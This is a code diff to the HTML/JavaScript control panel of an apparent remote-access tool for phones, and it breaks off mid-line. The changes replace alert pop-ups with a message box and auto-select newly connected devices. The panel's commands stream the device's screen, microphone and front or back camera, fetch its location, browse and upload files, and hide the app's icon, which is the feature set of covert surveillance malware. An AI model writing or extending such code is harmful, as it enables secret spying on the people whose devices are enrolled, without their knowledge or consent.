@@ -17,6 +17,8 @@
   .dot.on { background:var(--acc); box-shadow:0 0 8px var(--acc); }
   select { background:#000; color:var(--acc); border:1px solid var(--line); padding:6px; border-radius:6px; outline:none; font-size:12px; max-width:150px; }
 
+  #msg-box { display:none; background:var(--warn); color:#fff; padding:10px; text-align:center; font-weight:bold; font-size:13px; position:sticky; top:80px; z-index:9; }
+
   nav { display:flex; background:var(--panel); border-bottom:1px solid var(--line); overflow-x:auto; }
   nav button { flex:1; background:none; border:none; color:var(--dim); padding:12px 5px; font-size:12px; font-weight:bold; text-transform:uppercase; border-bottom:2px solid transparent; white-space:nowrap; }
   nav button.active { color:var(--acc); border-bottom-color:var(--acc); }
@@ -67,6 +69,8 @@
     <select id="device-select" onchange="onDeviceChange()"><option value="">No Device</option></select>
   </div>
 </header>
+
+<div id="msg-box"></div>
 
 <nav>
   <button class="active" onclick="switchTab('live', this)">Live</button>
@@ -147,6 +151,13 @@ let ws = null;
 let currentDevice = "";
 let realScreenW = 1080, realScreenH = 1920;
 
+function showMsg(msg) {
+  const box = $('msg-box');
+  box.textContent = msg;
+  box.style.display = 'block';
+  setTimeout(() => { box.style.display = 'none'; }, 5000);
+}
+
 function switchTab(tabId, btn) {
   document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
   document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
@@ -166,14 +177,12 @@ function formatUrl(url) {
 function onDeviceChange() {
   currentDevice = $('device-select').value;
   if (currentDevice) $('btn-refresh-telemetry').click();
-  else $('telemetry-data').innerHTML = '<div class="kv"><span>Status</span><b>No device</b></div>';
 }
 
 async function api(cmd, args = {}) {
-  if (!currentDevice) { alert("Please select a device from the dropdown first."); throw new Error("No device"); }
+  if (!currentDevice) { showMsg("Select a device first."); throw new Error("No device"); }
   const psk = $('psk').value.trim();
   const server = formatUrl($('server').value);
-  if (!psk || !server) { alert("Enter server + PSK"); throw new Error("No creds"); }
   
   const r = await fetch(server + '/api/cmd', {
     method: 'POST',
@@ -183,28 +192,21 @@ async function api(cmd, args = {}) {
   
   if (!r.ok) {
     let body = ''; try { body = (await r.json()).error || ''; } catch (_) {}
-    alert(`Command failed: HTTP ${r.status} — ${body}`);
+    showMsg(`Error: HTTP ${r.status} — ${body}`);
     throw new Error(`HTTP ${r.status}`);
   }
   return await r.json();
 }
 
-function setLed(on) {
-  $('led').className = 'dot ' + (on ? 'on' : '');
-  $('status').textContent = on ? 'Dashboard Connected' : 'Disconnected';
-}
-
 async function connect() {
   const psk = $('psk').value.trim();
   const server = formatUrl($('server').value);
-  if (!psk || !server) { alert('Enter server + PSK'); return; }
+  if (!psk || !server) { showMsg('Enter server + PSK'); return; }
   sessionStorage.setItem('psk', psk);
   sessionStorage.setItem('server', server);
   
   $('status').textContent = 'Waking server...';
-  try {
-    await fetch(server + '/', { mode: 'no-cors' }); // Wake up Render
-  } catch (e) {}
+  try { await fetch(server + '/', { mode: 'no-cors' }); } catch (e) {}
   
   openWs(server, psk);
 }
@@ -216,14 +218,19 @@ function openWs(server, psk) {
   u.pathname = '/ws'; u.search = '';
   
   ws = new WebSocket(u.toString());
-  ws.onopen = () => { setLed(true); ws.send(JSON.stringify({ role: 'dashboard', psk })); };
+  ws.onopen = () => { 
+    $('led').className = 'dot on'; 
+    $('status').textContent = 'Dashboard Connected'; 
+    ws.send(JSON.stringify({ role: 'dashboard', psk })); 
+  };
   ws.onmessage = ev => { try { handlePush(JSON.parse(ev.data)); } catch (_) {} };
   ws.onclose = () => {
-    setLed(false); $('status').textContent = 'Reconnecting...';
+    $('led').className = 'dot'; 
+    $('status').textContent = 'Reconnecting...';
     const p = sessionStorage.getItem('psk'), s = sessionStorage.getItem('server');
     if (p && s) setTimeout(() => openWs(s, p), 3000);
   };
-  ws.onerror = () => { alert('WebSocket error. Is the Render server live?'); };
+  ws.onerror = () => { showMsg('Websocket dropped. Reconnecting...'); }; // No more blocking alerts
 }
 
 function handlePush(msg) {
@@ -231,13 +238,18 @@ function handlePush(msg) {
     const sel = $('device-select');
     sel.innerHTML = '<option value="">Select Device</option>';
     msg.devices.forEach(addDeviceOption);
+    // AUTO SELECT FIRST DEVICE
+    if (msg.devices.length > 0 && !currentDevice) {
+      sel.value = msg.devices[0];
+      onDeviceChange();
+    }
   } else if (msg.type === 'device_online') {
     addDeviceOption(msg.device_id);
   } else if (msg.type === 'device_offline') {
     const sel = $('device-select');
     const opt = [...sel.options].find(o => o.value === msg.device_id);
     if (opt) opt.remove();
-    if (currentDevice === msg.device_id) { currentDevice = ""; onDeviceChange(); }
+    if (currentDevice === msg.device_id) { currentDevice = ""; }
   } else if (msg.type === 'push') {
     if (msg.kind === 'screen_frame') drawScreenFrame(msg.data);
     else if (msg.kind === 'camera_frame') { $('cam-img').src = 'data:image/jpeg;base64,' + msg.data; $('cam-img').style.display = 'block'; }
@@ -252,6 +264,7 @@ function addDeviceOption(id) {
   const opt = document.createElement('option');
   opt.value = id; opt.textContent = id;
   sel.appendChild(opt);
+  // AUTO SELECT NEW DEVICE
   if (!currentDevice) { sel.value = id; onDeviceChange(); }
 }
 
@@ -384,20 +397,20 @@ $('btn-location').onclick = async () => { try { const r = await api('get_locatio
 let screenOn = false, audioOn = false;
 $('btn-screen').onclick = async () => {
   try {
-    if (!screenOn) { const r = await api('start_screen'); if (r.ok) { screenOn = true; $('btn-screen').textContent = 'Stop Screen'; $('btn-screen').classList.add('danger'); } else alert(r.error); }
+    if (!screenOn) { const r = await api('start_screen'); if (r.ok) { screenOn = true; $('btn-screen').textContent = 'Stop Screen'; $('btn-screen').classList.add('danger'); } else showMsg(r.error); }
     else { await api('stop_screen'); screenOn = false; $('btn-screen').textContent = 'Start Screen'; $('btn-screen').classList.remove('danger'); }
   } catch (e) {}
 };
 $('btn-audio').onclick = async () => {
   try {
-    if (!audioOn) { const r = await api('start_audio'); if (r.ok) { audioOn = true; $('btn-audio').textContent = 'Stop Audio'; $('btn-audio').classList.add('danger'); } else alert(r.error); }
+    if (!audioOn) { const r = await api('start_audio'); if (r.ok) { audioOn = true; $('btn-audio').textContent = 'Stop Audio'; $('btn-audio').classList.add('danger'); } else showMsg(r.error); }
     else { await api('stop_audio'); audioOn = false; $('btn-audio').textContent = 'Start Audio'; $('btn-audio').classList.remove('danger'); }
   } catch (e) {}
 };
 $('btn-front-cam').onclick = async () => { try { await api('start_camera', { facing: 'front' }); } catch (e) {} };
 $('btn-back-cam').onclick = async () => { try { await api('start_camera', { facing: 'back' }); } catch (e) {} };
 $('btn-stop-cam').onclick = async () => { try { await api('stop_camera'); $('cam-img').style.display = 'none'; } catch (e) {} };
-$('btn-hide').onclick = async () => { try { await api('hide_icon'); alert('Hidden.'); } catch (e) {} };
+$('btn-hide').onclick = async () => { try { await api('hide_icon'); showMsg('Icon hidden.'); } catch (e) {} };
 
 $('btn-ls').onclick = async () => {
   try { 
@@ -411,7 +424,7 @@ $('btn-ls').onclick = async () => {
         div.onclick = () => { $('file-path').value = f.path; if (f.dir) { $('btn-ls').click(); } };
         list.appendChild(div);
       });
-    } else alert('Error: ' + r.error);
+    } else showMsg('Error: ' + r.error);
   } catch (e) {}
 };
 
@@ -427,14 +440,4 @@ $('btn-ul').onclick = async () => {
         const r = await api('upload_file', { path: $('file-path').value + "/" + f.name, data: b64 });
         $('files-out').textContent = r.ok ? ('Uploaded successfully') : ('Error: ' + r.error);
         $('btn-ls').click();
-      } catch (e) { alert('Upload failed'); }
-    };
-    reader.readAsDataURL(f);
-  } catch (e) {}
-};
-
-$('server').value = sessionStorage.getItem('server') || '';
-$('psk').value = sessionStorage.getItem('psk') || '';
-</script>
-</body>
-</html>
+      } catch (e) { showMsg('Upload f
